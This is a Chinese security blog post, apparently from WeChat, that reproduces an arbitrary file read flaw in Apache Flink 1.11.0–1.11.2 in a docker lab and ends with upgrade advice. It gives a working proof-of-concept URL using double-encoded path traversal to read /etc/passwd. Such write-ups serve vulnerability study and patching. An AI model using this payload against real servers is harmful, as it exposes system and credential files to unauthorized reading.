<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ZKiD1EqlWHa6xvY3iKrM_Q)

**0x01 漏洞简介**  

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEHyrrhI0qs9DZ8uSXibRmb8Hvrgic3HRUgg6NASkKytkJ4JibD0OkGIkQhhAHgictX2icaUnnV9fsGTWg/640?wx_fmt=png)

Apache Flink 是一个开源流处理框架，具有强大的流处理和批处理功能。

Apache Flink 1.11.0 中引入的一项更改 (包括版本 1.11.1 和 1.11.2) 允许攻击者通过 JobManager 进程的 REST 接口读取 JobManager 本地文件系统上的任何文件。

**0x02 漏洞影响**

```
1.11.0
1.11.1
1.11.2
```

**0x03 环境搭建**

这里直接在 docker 环境下复现，因为它搭建环境太香了！更新 docker

```
git pull
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEHyrrhI0qs9DZ8uSXibRmb8NkpwzrlRhFksIPoZyCcNyoYsib4DTvYNjtWTrBrZYamS0MDss7KJGdA/640?wx_fmt=png)

更新完成后启动 docker 编译环境

```
docker-compose up -d
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEHyrrhI0qs9DZ8uSXibRmb8OtwoD1uV8C8C4ErcC7Z12CickAFKZFVgdic1M2tHmaeNXZsanPJHu8sg/640?wx_fmt=png)

访问 http://1.1.1.1:8081 如下说明环境已经起来了

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEHyrrhI0qs9DZ8uSXibRmb8adn4KKeMYYr4lRgwriceE7ibswon3YC9ktOa6oU91yjcNBJ6Q1B12S9g/640?wx_fmt=png)

0x04 漏洞复现

poc

```
/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEHyrrhI0qs9DZ8uSXibRmb8liacwGT27NYjLxWfHdwxdUsv2apEeU9LJUVwJtExKgCK9L4yH2olBZQ/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEHyrrhI0qs9DZ8uSXibRmb8PfnrpJwURPbPNqLNVRxlPthQDUUSSsKNibshIS8JPQUcicib0pRGqiaCZw/640?wx_fmt=png)  

0x05 修复建议  

所有用户升级到 Flink 1.11.3 或 1.12.0，下载链接为：

```
https://flink.apache.org/downloads.html
https://flink.apache.org/downloads.html
```

0x06 参考文章

don9sec  

```
https://mp.weixin.qq.com/s/Wtcm8AFM5HrPOZ1tA0oHMg
```

**【往期推荐】**  

[未授权访问漏洞汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484804&idx=2&sn=519ae0a642c285df646907eedf7b2b3a&chksm=ea37fadedd4073c87f3bfa844d08479b2d9657c3102e169fb8f13eecba1626db9de67dd36d27&scene=21#wechat_redirect)

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)  

[记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

[【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)**

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)